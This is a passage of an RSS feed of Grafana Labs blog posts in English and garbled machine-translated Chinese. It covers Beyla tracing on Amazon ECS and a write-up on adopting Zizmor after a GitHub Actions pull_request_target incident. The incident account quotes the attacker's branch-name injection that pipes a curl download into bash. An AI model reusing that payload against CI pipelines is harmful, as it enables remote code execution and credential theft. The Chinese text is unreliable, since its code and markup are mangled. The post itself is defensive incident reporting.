=“/媒体/images/icons/icon-copy-small-2.svg” alt =“复制代码到剪贴板” width =“ 14”高度=“ 13”&gt;&#xA;&lt;span&gt;复制&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt; &lt;div class =“代码 - 尼珀代码snippet__border”&gt;&#xA;&lt;pre data-expanded =“ false”&gt; &lt;code class =“ language-none”&gt;“ pidmode”：“ task”，&lt;/code&gt; &lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt; &lt;p&gt;必须发送适当的beyla参数，以及合金的接收器。 &lt;/p&gt;&#xA;&lt;div class =“ code-snippet code-snippet__mini”&gt; &lt;div class =“ lang-toolbar__mini”&gt;&#xA;&lt;span class =“ code-clipboard”&gt;&#xA;&lt;button x-data =“ app_code_snippet（）” x-init =“ init（）” @click =“ copy（）”&gt;&#xA;&lt;img class =“ code-clipboard__icon” src =“/媒体/images/icons/icon-copy-small-2.svg” alt =“复制代码到剪贴板” width =“ 14”高度=“ 13”&gt;&#xA;&lt;span&gt;复制&lt;/span&gt;&#xA;&lt;/button&gt;&#xA;&lt;/span&gt;&#xA;&lt;/div&gt; &lt;div class =“代码 - 尼珀代码snippet__border”&gt;&#xA;&lt;pre data-expanded =“ false”&gt; &lt;code class =“ language-none”&gt;“环境”：[&#xA;{&#xA;“名称”：“ beyla_executable_name”，&#xA;“ value”：“ goblog”&#xA;}，，&#xA;{&#xA;“名称”：“ beyla_open_port”，&#xA;“价值”：“ 8443”&#xA;}，，&#xA;{&#xA;“名称”：“ otel_exporter_otlp_traces_endpoint”，&#xA;“ value”：“ http：//alloy-receiver.alloy：4318”&#xA;}&#xA;]，&lt;/code&gt; &lt;/pre&gt;&#xA;&lt;/div&gt;&#xA;&lt;/div&gt; &lt;p&gt;对于我的服务，我选择使用负载平衡器到端口8443，因为我的示例Web应用程序在端口8443上运行。此外，至关重要的是，至关重要的是，该服务与合金相同的命名空间至关重要，以便它可以与接收器进行通信。&lt;/p&gt; &lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt;收到数据后&#xA;&lt;a href =“/products/cloud/traces //？pg = blog＆plcmt = body-txt”&gt; grafana云痕迹&lt;/a&gt;  - 由grafana tempo供电的完全托管的分布式跟踪系统 - 您可以与所有其他轨迹一起查询，无论源，无论源，不管源，以监视和优化应用程序性能。下面的示例显示了TraceQL结果，但指标也是&#xA;&lt;a href =“/docs/grafana-cloud/send-data/traces/traces/germrics-generator/？pg = blog＆plcmt = body-txt = body-txt”&gt;从云痕迹生成&lt;/a&gt;，这启用了&lt;/a&gt;&#xA;&lt;a href =“/docs/grafana-cloud/monitor-applications/application-observability/？pg = blog＆plcmt = body-txt”&gt; grafana cloud应用程序可观察性&lt;/a&gt;。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1164px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/博客/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png“ data-srcset =”/媒体/blog/grafana-beyla-ecss-sidecar/grafana-cloud-traces.png？w = 320 320w，w = 320 320w，w = 320 320w， /Media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=550 550W，/media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-cloud-traces.png?w=750 750 750 750 750 750 750 75070w， /Media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=900 900w，/media/Blog/grafana-ebeyla-ecs-sidecar/grafana-cloud-cloud-traces.png?w=1040 1040w， /Media/blog/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png?w=1240 1240W，/media/Blog/grag/grafana-ecyla-ecs-ecs-sidecar/grafana-cloud-cloud-traces，png?w=19201920w&#39;&#39;&#xA;data-sizes =“ auto” alt =“ grafana云跟踪的屏幕截图。” width =“ 1164”高度=“ 1556”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/grafana-beyla-ecs-sidecar/grafana-cloud-traces.png”&#xA;alt =“ grafana云痕迹的屏幕截图。” width =“ 1164”高=“ 1556”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;H2 ID =“包装”&gt;包装&lt;/h2&gt;&#xA;&lt;p&gt;将Grafana Beyla与Amazon ECS整合在一起，通过大大简化可观察到可观察到的鲁棒性的路径，从而提供直接和长期的业务价值。最终，采用这种方法可以提高服务可靠性，提高开发人员的生产率，并通过为现代云环境提供可扩展的开源可观察性解决方案来支持业务敏捷性。&lt;/p&gt;&#xA;&lt;p&gt;要了解更多信息，请查看我们的文档&#xA;&lt;a href =“/docs/beyla/最终/？&#xA;&lt;a href =“/docs/Alloy/最终/？&#xA;&lt;a href =“ https://github.com/mwimpelberg28/ecsbeyla/tree/main” target =“ _ blank” rel =“ noopener noreferrer”&gt; github repo &lt;/a&gt;。 &lt;/p&gt;&#xA;&lt;p&gt; &lt;em&gt;&#xA;&lt;a href =“/products/cloud/？pg = blog＆plcmt = body-txt”&gt; grafana云&lt;/a&gt;是从指标，日志，痕迹，痕迹，仪表板等开始的最简单方法。我们有一个宽敞的永远的层次，并为每个用例都有计划。&#xA;&lt;a href =“//auth/ign-up/create-user/？pg = blog＆plcmt = body-txt”&gt;现在免费注册&lt;/a&gt;！&lt;/em&gt; &lt;/em&gt; &lt;/p&gt;</description>
      <pubDate>Wed, 09 Jul 2025 00:00:00 +0000</pubDate>
    </item>
    <item>
      <title>【How to detect vulnerable GitHub Actions at scale with Zizmor】如何使用Zizmor大规模检测脆弱的GitHub动作</title>
      <link>https://grafana.com/blog/2025/06/26/how-to-detect-vulnerable-github-actions-at-scale-with-zizmor/</link>
      <description>【&lt;p&gt;As we previously reported on April 26, 2025, we had a&#xA;&lt;a href=&#34;/blog/2025/04/27/grafana-security-update-no-customer-impact-from-github-workflow-vulnerability/&#34;&gt;security incident&lt;/a&gt; via an insecure GitHub Action and we have since published&#xA;&lt;a href=&#34;/blog/2025/05/15/grafana-security-update-post-incident-review-for-github-workflow-vulnerability-and-whats-next/&#34;&gt;a post-incident review&lt;/a&gt;. We have confirmed that there has been no code modification, unauthorized access to production systems, exposure of customer data, or access to personal information. &lt;/p&gt;&#xA;&lt;p&gt;In light of the incident and as part of our ongoing efforts to harden our infrastructure and pipelines, we have introduced Zizmor in our CI/CD pipelines for all repositories to detect and prevent potentially vulnerable GitHub Actions. &lt;/p&gt;&#xA;&lt;p&gt;Zizmor is an open source static analysis tool developed by William Woodruff, and Grafana Labs is partnering with Woodruff as a sponsor of the Zizmor project. Before we dive into the details of how we’ve deployed Zizmor, let’s first talk about the vulnerability that the attacker used against us.&lt;/p&gt;&#xA;&lt;h2 id=&#34;about-the-github-actions-vulnerability&#34;&gt;About the GitHub Actions vulnerability&lt;/h2&gt;&#xA;&lt;p&gt;At Grafana Labs, we use GitHub Actions as our primary&#xA;&lt;a href=&#34;https://aws.amazon.com/devops/continuous-integration/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;continuous integration&lt;/a&gt; system and we enable our teams to build and test the code they develop. GitHub Actions enables teams to define their own repeatable build and test processes that run alongside the code they write, which can then be triggered by a host of events from inside GitHub.&lt;/p&gt;&#xA;&lt;p&gt;A vulnerable GitHub Action, utilizing pull-request-target instead of the safer pull-request, led to a security incident in April. This allowed an unauthorized user to execute code from a malicious branch within a trusted environment. By naming their branch to trigger a command (essentially using &lt;code&gt;(&#39;child_process&#39;).exec(&#39;curl$(IFS)-pathtofile$(IFS)bash&#39;&lt;/code&gt;) the attacker was able to run a remote script. This script then exposed environment variables, including credentials, within the trusted environment.&lt;/p&gt;&#xA;&lt;p&gt;We are proud that our proactive security measures were activated as planned. Our canary tokens alerted us when their use had been attempted. Because Grafana Labs has a globally distributed workforce, we had engineers who jumped on our alerts almost immediately, and we were able to coordinate work across teams and time zones to shut down credentials, access, actions, and automations quickly and decisively.&lt;/p&gt;&#xA;&lt;p&gt;Our investigation into the incident wrapped up May 12, 2025, and &lt;strong&gt;we confirmed that there has been no code modification, unauthorized access to production systems, exposure of customer data, or access to personal information.&lt;/strong&gt;&lt;/p&gt;&#xA;&lt;h2 id=&#34;introducing-zizmor&#34;&gt;Introducing Zizmor&lt;/h2&gt;&#xA;&lt;p&gt;Now that we have a shared understanding of the problem, let’s dive into how we will prevent such problems from arising in the future. In other areas of code, we often employ static analysis to detect common vulnerabilities or weaknesses (&#xA;&lt;a href=&#34;https://cwe.mitre.org/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;CWEs&lt;/a&gt;). There are a couple of tools that are available for statically analyzing GitHub Actions. GitHub’s own&#xA;&lt;a href=&#34;https://github.blog/security/application-security/how-to-secure-your-github-actions-workflows-with-codeql/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;CodeQL&lt;/a&gt; has the ability to detect a wide variety of attacks. There’s also Step Security’s hardened runner, which enables teams to do a deeper inspection of what actions are doing when they run. However, the tool that we settled on using across our estate is the open source project Zizmor.&lt;/p&gt;&#xA;&lt;p&gt;To mitigate the GitHub Actions incident, a large effort was undertaken by not only the security team at Grafana Labs, but also the entire engineering department to run Zizmor against all of our GitHub Actions in repositories. Zizmor picks up not just uses of `pull_request_target` but also a whole host of&#xA;&lt;a href=&#34;https://docs.zizmor.sh/audits/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;audit rules&lt;/a&gt;, such as forbidden-uses and unpinned-uses.&lt;/p&gt;&#xA;&lt;p&gt;After the&#xA;&lt;a href=&#34;https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;tj-actions incident&lt;/a&gt; with reviewdog, in which a third-party supply chain attack was introduced targeting specific repositories,  Grafana Labs’ security team made a decision to restrict the usage of reviewdog actions. Using Zizmor with the forbidden uses allows us to additionally put in technical blocks to prevent the usage of this set of actions within our repositories. In order to prevent future attacks where a tag has been overwritten with a new commit, Zizmor also audits the use of unpinned versions of actions, instead preferring an explicit commit with a YAML comment to the tag that it relates to.&lt;/p&gt;&#xA;&lt;h2 id=&#34;zizmor--grafana-labs&#34;&gt;Zizmor + Grafana Labs&lt;/h2&gt;&#xA;&lt;p&gt;We’ve now understood the problem, the tooling that we can use to prevent the issue going forward, so how do we use this at Grafana Labs? We started by&#xA;&lt;a href=&#34;https://github.com/grafana/shared-workflows/blob/main/.github/workflows/reusable-zizmor.yml&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;writing a reusable workflow&lt;/a&gt; in a public repository that we use across Grafana Labs, but that can also be used across all organizations that utilize GitHub Actions.&lt;/p&gt;&#xA;&lt;p&gt;The reusable workflow does a couple of things. First, it tries to establish the Zizmor configuration that we publicly define in that repository. This is the &lt;strong&gt;default&lt;/strong&gt; that we use, but it is not used if the repository defines its own configuration, unless of course you set the &lt;code&gt;always-use-default-config parameter&lt;/code&gt;. It then runs Zizmor, twice — once to produce a&#xA;&lt;a href=&#34;https://sarifweb.azurewebsites.net/&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;SARIF report&lt;/a&gt; and the other in a human readable comment form. We then try to upload the SARIF version to GitHub code scanning. (&lt;em&gt;Note: This is free if your repository is public.&lt;/em&gt;) Finally the workflow decides its exit status based on the result of the Zizmor run, and this informs the GitHub Action check status.&lt;/p&gt;&#xA;&lt;p&gt;This is great, but we want to run this for more than 2,000 repositories and we don’t want to have to update every repository to point at this repository. Enter&#xA;&lt;a href=&#34;https://docs.github.com/en/enterprise-cloud@latest/organizations/managing-organization-settings/creating-rulesets-for-repositories-in-your-organization&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;GitHub Organization rulesets&lt;/a&gt;. These are like the rulesets that you can apply to a single repository, but instead you can apply them against all repositories in your organization.&lt;/p&gt;&#xA;&lt;p&gt;The great thing about this is that we only need to define the workflow once. We opted to do this in a&#xA;&lt;a href=&#34;https://github.com/grafana/security-github-actions/blob/main/.github/workflows/self-zizmor.yaml&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;repository that’s controlled by the security team&lt;/a&gt; at Grafana Labs, but we took a lot of inspiration from the shared-workflows repository. Here we can define the parameters to which we want this workflow to run, pin the version, and define other behaviors that we expect to hold true from the workflow runs. In this example, we check whether there are any workflows to run against before we run Zizmor. (There’s no point running it against zero targets!)&lt;/p&gt;&#xA;&lt;p&gt;Now that we have an action, we can use rulesets to roll this out to all of the repositories in our organization. We use the “Require workflows to pass before merging” check to define that from the security controlled repository.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1898px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/zizmor/ruleset-configuration-zizmor.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/zizmor/ruleset-configuration-zizmor.png&#34;data-srcset=&#34;/media/blog/zizmor/ruleset-configuration-zizmor.png?w=320 320w, /media/blog/zizmor/ruleset-configuration-zizmor.png?w=550 550w, /media/blog/zizmor/ruleset-configuration-zizmor.png?w=750 750w, /media/blog/zizmor/ruleset-configuration-zizmor.png?w=900 900w, /media/blog/zizmor/ruleset-configuration-zizmor.png?w=1040 1040w, /media/blog/zizmor/ruleset-configuration-zizmor.png?w=1240 1240w, /media/blog/zizmor/ruleset-configuration-zizmor.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;GitHub Branch Ruleset configuration for zizmor workflow&#34;width=&#34;1898&#34;height=&#34;588&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/zizmor/ruleset-configuration-zizmor.png&#34;&#xA;alt=&#34;GitHub Branch Ruleset configuration for zizmor workflow&#34;width=&#34;1898&#34;height=&#34;588&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;p&gt;Once we enable the check (in evaluation mode initially) we start to see workflow runs being expected on existing and new PRs. It’s worth noting that GitHub’s system requires &lt;strong&gt;existing&lt;/strong&gt; PRs to either be closed and re-opened or to have an empty commit pushed to the branch.&lt;/p&gt;&#xA;&lt;figure&#xA;class=&#34;figure-wrapper figure-wrapper__lightbox w-100p &#34;&#xA;style=&#34;max-width: 1672px;&#34;&#xA;itemprop=&#34;associatedMedia&#34;&#xA;itemscope=&#34;&#34;&#xA;itemtype=&#34;http://schema.org/ImageObject&#34;&#xA;&gt;&lt;a&#xA;class=&#34;lightbox-link&#34;&#xA;href=&#34;/media/blog/zizmor/zizmor-check.png&#34;&#xA;itemprop=&#34;contentUrl&#34;&#xA;&gt;&lt;div class=&#34;img-wrapper w-100p h-auto&#34;&gt;&lt;img&#xA;class=&#34;lazyload &#34;&#xA;data-src=&#34;/media/blog/zizmor/zizmor-check.png&#34;data-srcset=&#34;/media/blog/zizmor/zizmor-check.png?w=320 320w, /media/blog/zizmor/zizmor-check.png?w=550 550w, /media/blog/zizmor/zizmor-check.png?w=750 750w, /media/blog/zizmor/zizmor-check.png?w=900 900w, /media/blog/zizmor/zizmor-check.png?w=1040 1040w, /media/blog/zizmor/zizmor-check.png?w=1240 1240w, /media/blog/zizmor/zizmor-check.png?w=1920 1920w&#34;&#xA;data-sizes=&#34;auto&#34;alt=&#34;Zizmor check expecting result in repository&#34;width=&#34;1672&#34;height=&#34;188&#34;/&gt;&#xA;&lt;noscript&gt;&#xA;&lt;img&#xA;src=&#34;/media/blog/zizmor/zizmor-check.png&#34;&#xA;alt=&#34;Zizmor check expecting result in repository&#34;width=&#34;1672&#34;height=&#34;188&#34;/&gt;&#xA;&lt;/noscript&gt;&lt;/div&gt;&lt;/a&gt;&lt;/figure&gt;&#xA;&lt;h2 id=&#34;challenges-with-zizmor&#34;&gt;Challenges with Zizmor&lt;/h2&gt;&#xA;&lt;p&gt;No implementation is without challenges, and we’ve certainly had a couple of them while implementing Zizmor across our software estate. Two notable challenges are detailed here.&lt;/p&gt;&#xA;&lt;h3 id=&#34;1-rate-limiting&#34;&gt;1. Rate limiting&lt;/h3&gt;&#xA;&lt;p&gt;Firstly, GitHub’s rate limiting of repository and application tokens causes some headaches when running the online checks that Zizmor can do. This is down to the fact that Zizmor uses the GitHub API to fetch the tags and branches for a given action. When this is done at scale, and on large projects, you quickly hit GitHub’s 15,000 calls per hour. It looks like the maintainer has already started thinking about this use case in&#xA;&lt;a href=&#34;https://github.com/zizmorcore/zizmor/issues/764&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;this issue&lt;/a&gt;.&lt;/p&gt;&#xA;&lt;h3 id=&#34;2-centralized-ruleset-configuration&#34;&gt;2. Centralized ruleset configuration&lt;/h3&gt;&#xA;&lt;p&gt;We’ve also run into another GitHub issue — running Zizmor as a centralized ruleset in GitHub requires us to define the Zizmor configuration ahead of time. We want to define this as a git blob right next to the workflow; however, we need to be able to use the GitHub &lt;code&gt;id-token: write&lt;/code&gt; permission. In our first-party repositories, this is fine. However, GitHub rightly restricts this from being run in a fork, which makes grabbing the default configuration hard to get. One of the work arounds that we used for this is to define a &lt;code&gt;.github/zizmor.yml&lt;/code&gt; file in the repositories that we get a lot of traction from. If there is no file present, we also fall back to the built-in Zizmor configuration.&lt;/p&gt;&#xA;&lt;h2 id=&#34;summary&#34;&gt;Summary&lt;/h2&gt;&#xA;&lt;p&gt;In summary, we love Zizmor at Grafana Labs. It will help us prevent attacks in the future with a relatively lightweight binary running. We’ve opted to run in an offline mode for PRs due to online mode consuming our rate limit. This means that we don’t benefit from all the checks that Zizmor offers, such as&#xA;&lt;a href=&#34;https://docs.zizmor.sh/audits/#impostor-commit&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;imposter-commits&lt;/a&gt; and&#xA;&lt;a href=&#34;https://docs.zizmor.sh/audits/#ref-confusion&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;ref-confusion&lt;/a&gt;, but this does mean we can run it fast and that we don’t hit the GitHub API rate limit quickly.&lt;/p&gt;&#xA;&lt;p&gt;We did, however, opt to run the additional checks on a scheduled job against some of our most popular repositories (currently the LGTM stack repos). And the next time a GitHub Actions vulnerability appears in the wild, we’ll be more prepared with Zizmor checking our workflow hygiene.&lt;/p&gt;】&lt;p&gt;正如我们先前在2025年4月26日报道的那样，我们有一个&#xA;&lt;a href =“/blog/2025/04/27/grafana-security-update-no-customer-impact-gitrom-github-github-workflow-vulnerability/“&gt;安全事件&lt;/a&gt;通过Insecure github Action，我们自此发表了&#xA;&lt;a href =“/blog/2025/05/15/grafana-security-update-post-incent-indent-indent-indident-indist-indist-review for-github-workflow-vulnerabily-vulnerability-and-whats-next/”&gt; in Incistion评论&lt;/a&gt;。我们已经确认没有代码修改，未经授权访问生产系统，客户数据的曝光或访问个人信息。 &lt;/p&gt;&#xA;&lt;p&gt;鉴于这一事件以及我们为硬化基础设施和管道加强的努力的一部分，我们在CI/CD管道中引入了Zizmor，以供所有存储库检测并防止潜在脆弱的GitHub动作。 &lt;/p&gt;&#xA;&lt;p&gt; Zizmor是William Woodruff开发的开源静态分析工具，Grafana Labs正在与Woodruff合作作为Zizmor Project的赞助商。在我们深入了解如何部署Zizmor的细节之前，让我们首先谈论攻击者对我们使用的脆弱性。&lt;/p&gt;&#xA;&lt;h2 id =“关于github动作脆弱性&lt;/h2&gt;&#xA;&lt;p&gt;在Grafana Labs，我们使用GitHub动作作为主要&#xA;&lt;a href =“ https://aws.amazon.com/devops/continuul-integration/” target =“ _ blank” rel =“ noopener noreferrer”&gt;连续集成&lt;/a&gt;系统，我们使我们的团队能够构建和测试他们开发的代码。 GitHub操作使团队能够定义自己的可重复的构建和测试过程，这些构建和测试过程与他们编写的代码并肩运行，然后可以由内部的一系列事件触发。&lt;/p&gt;&#xA;&lt;p&gt;利用拉普特目标而不是更安全的plup-要求，这是一个脆弱的github动作，导致4月份的安全事件。这使未经授权的用户可以在受信任的环境中从恶意分支执行代码。通过将其分支命名以触发命令（本质上是使用&lt;code&gt;（&#39;child_process&#39;）。exec（&#39;curl $（ifs）-pathtofile $（ifs）bash&#39;&lt;/code&gt;）攻击者能够运行一个远程脚本。此脚本然后裸露了脚本，然后裸露了包括凭据的环境变量，包括信任的环境。&lt;/p&gt; &lt;/p&gt; &lt;/p&gt; &lt;/p&gt; &lt;/p&gt; &lt;/p。&#xA;&lt;p&gt;我们为我们的主动安全措施按计划激活了我们的主动安全措施感到自豪。我们的金丝雀代币在尝试使用时提醒我们。由于Grafana Labs拥有全球分布的劳动力，因此我们有工程师几乎立即登上了我们的警报，并且我们能够跨团队和时区协调工作，以快速，果断地关闭凭据，访问，行动和自动化。&lt;/p&gt;&gt; &lt;/p&gt;。&lt;/p&gt;&#xA;&lt;p&gt;我们对2025年5月12日结束的事件的调查，&lt;strong&gt;我们确认没有代码修改，未经授权访问生产系统，暴露于客户数据或访问个人信息。&lt;/strong&gt; &lt;/p&gt; &lt;/strong&gt; &lt;/p&gt;&#xA;&lt;H2 ID =“介绍-Zizmor”&gt;介绍Zizmor &lt;/h2&gt;&#xA;&lt;p&gt;现在我们对问题有共同的了解，让我们深入了解如何上述将来出现的问题。在其他法规领域，我们经常采用静态分析来检测共同的漏洞或弱点（&#xA;&lt;a href =“ https://cwe.mitre.org/” target =“ _ blank” rel =“ noopener noreferrer”&gt; cwes &lt;/a&gt;）。有几个工具可用于静态分析GitHub动作。 Github自己的&#xA;&lt;a href =“ https://github.blog/security/security/application-security/how-to-secure-your-your-github-actions-workflows-with-with-codeql/” target =“ _ black” rel =“ noopener noreferrer”&gt; codeql &lt;/a&gt;能够检测到一定的攻击。还有STEP Security的硬性跑步者，这使团队能够对他们跑步时的行动进行更深入的检查。但是，我们在整个遗产中使用的工具是开源项目Zizmor。&lt;/p&gt;&#xA;&lt;p&gt;为了减轻GitHub的行动事件，不仅是Grafana Labs的安全团队，而且还在整个工程部门进行了巨大的努力，以对抗我们在存储库中的所有GitHub行动。 Zizmor拾取不仅使用`plul_request_target`使用了&#xA;&lt;a href =“ https://docs.zizmor.sh/audits/” target =“ _ blank” rel =“ noopener noreferrer”&gt;审核规则&lt;/a&gt;，例如Forbidden-uses和undinned-uses。&lt;/p&gt;&gt; &lt;/p&gt;&#xA;&lt;p&gt;之后&#xA;&lt;a href=&#34;https://www.wiz.io/blog/new-github-action-supply-chain-attack-reviewdog-action-setup&#34; target=&#34;_blank&#34; rel=&#34;noopener noreferrer&#34;&gt;tj-actions incident&lt;/a&gt; with reviewdog, in which a third-party supply chain attack was introduced targeting specific repositories,  Grafana Labs’安全团队决定限制对审查doce行动的使用。将Zizmor与禁止使用一起使用，使我们还可以将技术块放入技术块中，以防止在我们的存储库中使用这组操作。为了防止将未来的攻击用新的提交覆盖标签，Zizmor还审核了使用未添加的动作版本，而是更喜欢用YAML评论的明确提交对其与之相关的标签。&lt;/p&gt;。&#xA;&lt;h2 id =“ zizmor-- grafana-labs”&gt; Zizmor + Grafana Labs &lt;/h2&gt;&#xA;&lt;p&gt;现在，我们已经了解了问题，即我们可以用来防止问题的工具，那么我们如何在Grafana Labs使用此问题？我们开始&#xA;&lt;a href =“ https://github.com/grafana/shared-workflows/blob/main/.github/.github/workflows/reusable-zizmor.yml” target =“ _ black” rel =“ r =” noopener noreferrer“利用github动作。&lt;/p&gt;&#xA;&lt;p&gt;可重复使用的工作流程有几件事。首先，它试图建立我们在该存储库中公开定义的Zizmor配置。这是我们使用的&lt;strong&gt;默认值&lt;/strong&gt;，但是如果存储库定义了自己的配置，则不会使用它，除非您当然设置&lt;code&gt;始终使用deft-default-config参数&lt;/code&gt;。然后它运行Zizmor，两次 - 一次生产&#xA;&lt;a href =“ https://sarifweb.azurewebsites.net/” target =“ _blank” rel =“ noopener noreferrer”&gt; sarif报告&lt;/a&gt;，另一个以人类可读的评论表格。然后，我们尝试将SARIF版本上传到GitHub代码扫描中。 （&lt;em&gt;注意：如果您的存储库是公开的，这是免费的。&lt;/em&gt;）最终，工作流根据Zizmor运行的结果决定其退出状态，这将为GitHub Action Check Check Status提供信息。&lt;/p&gt;&#xA;&lt;p&gt;这很棒，但是我们希望以2,000多个存储库来运行此功能，并且我们不想更新每个存储库以指向此存储库。进入&#xA;&lt;a href =“ https://docs.github.com/en/enterprise-cloud@latest/organizations/managing-organization-erganization-creating-rulesets-rulesets-for-repositories-for-repositories-in-your-organization-in-your-organization” target =“ _ blank”这些就像可以应用于单个存储库的规则集，但是您可以将它们应用于组织中的所有存储库。&lt;/p&gt;&#xA;&lt;p&gt;很棒的事情是，我们只需要定义一次工作流程即可。我们选择在&#xA;&lt;a href =“ https://github.com/grafana/security-github-actions/blob/main/.github/workflows/selp-zizmor.yaml” target =“ _ blank” rel =“ rel =” noopener noreferrer&#39;存储库。在这里，我们可以定义我们希望此工作流程运行，固定版本的参数，并定义我们期望从工作流程中运行的其他行为。在此示例中，我们检查在运行Zizmor之前是否存在任何工作流程。 （毫无意义地将其与零目标运行！）&lt;/p&gt;&#xA;&lt;p&gt;既然我们有了一个措施，我们就可以使用规则集将其推广到我们组织中的所有存储库。我们使用“需要工作流程在合并之前通过”检查以从安全控制的存储库中定义。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1898px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/zizmor/prureet-configuration-zizmor.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/zizmor/prureet-configuration-zizmor.png” data-srcset =“/媒体/blog/zizmor/zizmor/zizmor/prounet-configuration-zizmor.png？ /media/blog/zizmor/ruleset-configuration-zizmor.png?w=750 750w, /media/blog/zizmor/ruleset-configuration-zizmor.png?w=900 900w, /media/blog/zizmor/ruleset-configuration-zizmor.png?w=1040 1040W，/media/blog/zizmor/ruleset-configuration-zizmor.png?w=1240 1240W，/media/Blog/Zizmor/Ruleset-Configuration-configuration-zizmor.png?w=1920192010w“&#xA;data-sizes =“ auto” alt =“ zizmor workflow的github branch规则集配置” width =“ 1898” height =“ 588”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/blog/zizmor/prureet-configuration-zizmor.png”&#xA;alt = Zizmor工作流的GitHub分支规则集配置“ width =“ 1898”高度=“ 588”/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;p&gt;一旦我们启用检查（最初是在评估模式下），我们就会开始看到现有和新PR的工作流程。值得注意的是，GitHub的系统需要&lt;strong&gt;现有的&lt;/strong&gt; PR才能关闭并重新开放或将空的提交推向分支。&lt;/p&gt;&#xA;&lt;图&#xA;class =“ figup-wrapper figuper-wrapper__lightbox W-100P”&#xA;样式=“最大宽度：1672px;”&#xA;itemprop =“ iSsectedmedia”&#xA;itemScope =“”&#xA;itemType =“ http://schema.org/imageObject”&#xA;&gt; &lt;a&#xA;class =“ Lightbox-link”&#xA;href =“/媒体/blog/zizmor/zizmor-check.png”&#xA;itemprop =“ contenturl”&#xA;&gt; &lt;div class =“ img-wrapper W-100P H-auto”&gt; &lt;img&#xA;class =“ Lazyload”&#xA;data-src =“/媒体/blog/zizmor/zizmor-check.png” data-srcset =“/媒体/blog/zizmor/zizmor/zizmor-check.png？ /Media/blog/zizmor/zizmor-check.png?w=750 750W，/media/Blog/Zizmor/Zizmor/Zizmor-Check.png?w=900 900W，/media/Media/Blog/Zizmor/Zizmor/Zizmor/Zizmor-Check.png?w=900 /Media/blog/zizmor/zizmor-check.png?w=1240 1240W，/media/Blog/Zizmor/Zizmor/Zizmor-Check.png?w=19201920w“&#xA;data-sizes =“ auto” alt =“ zizmor检查预期在存储库中的预期结果” width =“ 1672” height =“ 188”/&gt;&#xA;&lt;NoScript&gt;&#xA;&lt;img&#xA;src =“/媒体/博客/zizmor/zizmor-check.png”&#xA;alt =“ Zizmor检查预期结果”存储库“ width =” 1672“高度=” 188“/&gt;&#xA;&lt;/noscript&gt; &lt;/div&gt; &lt;/a&gt; &lt;/figie&gt;&#xA;&lt;H2 ID =“挑战 -  Zizmor”&gt; Zizmor &lt;/h2&gt;挑战&#xA;&lt;p&gt;没有任何实施没有挑战，我们当然有几个在我们的软件遗产中实施Zizmor的同时。这里详细介绍了两个值得注意的挑战。&lt;/p&gt;&#xA;&lt;H3 ID =“ 1速率限制”&gt; 